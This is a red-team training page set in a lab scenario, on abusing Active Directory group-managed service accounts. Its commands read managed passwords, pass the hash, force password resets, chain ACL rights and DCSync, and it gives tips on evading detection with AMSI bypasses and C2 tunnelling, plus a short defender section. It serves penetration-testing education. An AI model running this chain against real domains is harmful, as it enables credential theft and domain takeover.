---
layout: training-page
title: "gMSA Abuse — Group-Managed Service Accounts — Red Team Academy"
module: "Active Directory"
tags:
  - gmsa
  - managed-service-account
  - acl
  - delegation
  - nha
page_key: "ad-gmsa-abuse"
render_with_liquid: false
---

# gMSA Abuse — Group-Managed Service Accounts

## What is a gMSA

**Group-Managed Service Accounts (gMSAs)** are Windows Server 2012+ service accounts whose passwords are automatically generated, rotated, and distributed by the domain controller. The password is a 120-byte blob stored in the `msDS-ManagedPassword` attribute of the account — readable only by principals listed in `msDS-GroupMSAMembership` (the "PrincipalsAllowedToRetrieveManagedPassword" property).

Because the DC generates and derives the NTLM/Kerberos keys from that blob, an attacker who can read `msDS-ManagedPassword` can derive the same keys — without triggering a password reset — and immediately authenticate as the gMSA. Unlike traditional service accounts, gMSAs don't rotate because a human clicks "reset"; they rotate on schedule (default 30 days). Between rotations, the derived key is stable.

> **NHA scenario:** The gMSA `gmsaNFS$` is authorized to run on `SRV03` (`share`). `gmsaNFS$` has `ForceChangePassword` on the `backup` user. The plan: read `gmsaNFS$`'s password from LDAP while attacking from `share` (or any principal permitted to retrieve it), derive its NT hash, use that to reset `backup`'s password, then ACL-chain to Domain Admin.

## Identifying gMSAs and Their Principals

```powershell
# All gMSAs in the domain:
Get-ADServiceAccount -Filter {ObjectClass -eq 'msDS-GroupManagedServiceAccount'} -Properties *

# Key attribute:
#   msDS-GroupMSAMembership     — who can read the password
#   msDS-ManagedPasswordInterval — rotation period in days
#   msDS-HostServiceAccount      — which hosts can run this account

# From Linux (bloodyAD):
bloodyAD -u user -p 'pass' -d domain.local --host dc.domain.local \
  get search --filter '(objectClass=msDS-GroupManagedServiceAccount)' \
  --attr sAMAccountName,msDS-GroupMSAMembership,msDS-HostServiceAccount

# BloodHound — find gMSAs and who can read them:
# Cypher:
# MATCH p=(u)-[r:ReadGMSAPassword]->(g:User) WHERE g.gmsa = true RETURN p
```

## Abuse Path 1 — Read gMSA Password from Windows

If you run in the context of a principal listed in `msDS-GroupMSAMembership` (user, group member, or the computer account itself when `HostServiceAccount`), you can decrypt the managed password blob directly.

```powershell
# Native PowerShell on an authorized host:
$gmsa = Get-ADServiceAccount -Identity gmsaNFS -Properties 'msDS-ManagedPassword'
$mp = $gmsa.'msDS-ManagedPassword'
$blob = ConvertFrom-ADManagedPasswordBlob $mp
$blob.SecureCurrentPassword | ConvertFrom-SecureString -AsPlainText
# → 120-byte password blob

# Or the purpose-built PowerShell tool (MichaelGrafnetter's DSInternals):
Install-Module DSInternals -Force
Get-ADReplAccount -SamAccountName gmsaNFS$ -Server dc-ac.academy.ninja.lan
# → Returns NT hash, AES keys, and Kerberos keys derived from the gMSA blob
```

**DSInternals is the cleanest path** because it outputs the NT/AES keys directly — no intermediate password decoding step. Unless AMSI is aggressive, DSInternals modules run clean on a typical Defender baseline.

## Abuse Path 2 — Read gMSA Password from Linux

No need for a Windows host. Any LDAP client that can read `msDS-ManagedPassword` — with credentials of an authorized principal — works. The trick: `msDS-ManagedPassword` is only returned over LDAPS or LDAP with Kerberos (confidentiality bit), not plain LDAP.

```bash
# bloodyAD from Linux (requires password or NTLM of an authorized principal):
bloodyAD -u backup -p 'Password123!' -d academy.ninja.lan \
  --host 192.168.58.20 \
  get object 'gmsaNFS$' --attr msDS-ManagedPassword

# With an NTLM hash (pass-the-hash):
bloodyAD -u 'SQL$' -p ':NTLM_HASH' -d academy.ninja.lan \
  --host 192.168.58.20 \
  get object 'gmsaNFS$' --attr msDS-ManagedPassword
# → Outputs NTLM, AES128, AES256 derived from the managed password.

# GMSAPasswordReader.py (Python tool — Semperis / SpecterOps):
python3 gMSADumper.py -u user -p 'pass' -d academy.ninja.lan -l 192.168.58.20
# Output:
#   gmsaNFS$:::<NTLM_HASH>
#   gmsaNFS$:aes256-cts-hmac-sha1-96:<HEX>
#   gmsaNFS$:aes128-cts-hmac-sha1-96:<HEX>
```

**OPSEC note:** Reading `msDS-ManagedPassword` generates Event ID 4662 on the DC with a specific property set access — defenders often monitor this. From Linux with Impacket / bloodyAD, the source is a Linux IP rather than an enterprise-managed host, which is also anomalous. Use tunneled connections through a compromised host where appropriate (e.g., SOCKS over C2 — see [Chisel SOCKS Pivoting](/pivoting/chisel-socks/)).

## Abuse Path 3 — Authenticate as the gMSA (Pass-the-Hash)

Once you have the NT hash or AES keys, you authenticate as the gMSA. gMSAs often hold service-account-tier privileges — they sit in `Domain Users`, often in service-specific groups, and occasionally in Protected Users (which breaks cleartext CredSSP but not hash auth).

```bash
# Linux — Impacket PtH as gmsaNFS$:
secretsdump.py -hashes :NT_HASH 'academy.ninja.lan/gmsaNFS$@192.168.58.23'

# NetExec smb auth as the gMSA to find its privileges:
netexec smb 192.168.58.0/24 -u 'gmsaNFS$' -H NT_HASH -d academy.ninja.lan --shares

# Kerberos ticket using derived AES256 key (stealthier — avoids RC4):
getTGT.py -aesKey AES256_KEY 'academy.ninja.lan/gmsaNFS$' -dc-ip 192.168.58.20
export KRB5CCNAME=gmsaNFS\$.ccache
```

## Abuse Path 4 — Use the gMSA's ACL Rights (NHA Chain)

The gMSA itself may have rights over other principals. In NHA, `gmsaNFS$` has `ForceChangePassword` on `backup`. Chain it:

```bash
# Step 1 — Read gmsaNFS$ password blob:
bloodyAD -u authorized_user -p 'pass' -d academy.ninja.lan --host 192.168.58.20 \
  get object 'gmsaNFS$' --attr msDS-ManagedPassword
# → Extract NT hash

# Step 2 — As gmsaNFS$, force-change backup's password:
net rpc password backup 'NewP@ss123!' \
  -U 'academy.ninja.lan/gmsaNFS$%' \
  -S 192.168.58.20
# (or bloodyAD / rpcclient setuserinfo2 23)

# Step 3 — Chain from backup (see NHA Stage 8):
# backup has WriteOwner on Sensei → take ownership → add to Sensei → DA-adjacent → DA.
```

See [ACL Abuse](/active-directory/acl-abuse/) for WriteOwner → full control escalation.

## Abuse Path 5 — gMSA Compromise via DCSync (Post-DA)

Once you're Domain Admin in the domain where the gMSA lives, DCSync retrieves all gMSA hashes directly from AD replication traffic. Useful for persistence — gMSAs are typically trusted by service logic and less scrutinized than user accounts.

```bash
# DCSync the gMSA after achieving DA:
secretsdump.py -just-dc-user 'gmsaNFS$' 'academy.ninja.lan/Administrator:pass@192.168.58.20'
```

## Detection & Mitigation (Purple View)

- **Audit policy on DC:** Enable "Audit Directory Service Access" with SACL for `msDS-ManagedPassword`. Alert on Event 4662 with the corresponding GUID.
- **Restrict `PrincipalsAllowedToRetrieveManagedPassword`:** Don't use broad groups like `Domain Computers`. Scope tightly.
- **Rotate the Kerberos keys** by resetting the gMSA if compromise is suspected — `Reset-ADServiceAccount -Identity gmsaNFS` (requires DA).
- **Protect high-value gMSAs** with Protected Users group membership and Authentication Policy Silos where feasible.
- Monitor for LDAP reads of `msDS-ManagedPassword` from unexpected source IPs — especially Linux attacker hosts.

## Windows Defender / EDR Considerations

- `DSInternals` and related PowerShell modules are not typically flagged by Defender, but their activity (LSA/replication APIs) can trigger behavior-based rules. Use [AMSI Bypass](/evasion/amsi-bypass/) before import on monitored hosts.
- `bloodyAD` and `GMSAPasswordReader` from a Linux attacker machine have zero Defender exposure.
- When pivoting, ensure LDAPS (636) or LDAP-with-Kerberos traffic is not flagged by network monitoring. Proxy through already-established C2 where possible.

## Key Resources

- [Microsoft docs — Group Managed Service Accounts Overview](https://learn.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview)
- [DSInternals — authoritative AD replication & password tools](https://github.com/MichaelGrafnetter/DSInternals)
- [GMSAPasswordReader — SpecterOps tool](https://github.com/rvazarkar/GMSAPasswordReader)
- [gMSADumper.py — Python LDAP attacker tool](https://github.com/micahvandeusen/gMSADumper)
- [HackTricks — Pentesting gMSA](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/pentesting-active-directory/gmsa)

## Related Pages

- [ACL / ACE Abuse](/active-directory/acl-abuse/)
- [Kerberoasting & AS-REP](/active-directory/kerberoasting/)
- [BloodHound / SharpHound](/active-directory/bloodhound/)
- [DCSync & Golden Ticket](/active-directory/dcsync/)
- [Pass-the-Hash](/active-directory/pass-the-hash/)
- [Ninja Hacker Academy (NHA)](/active-directory/nha/)
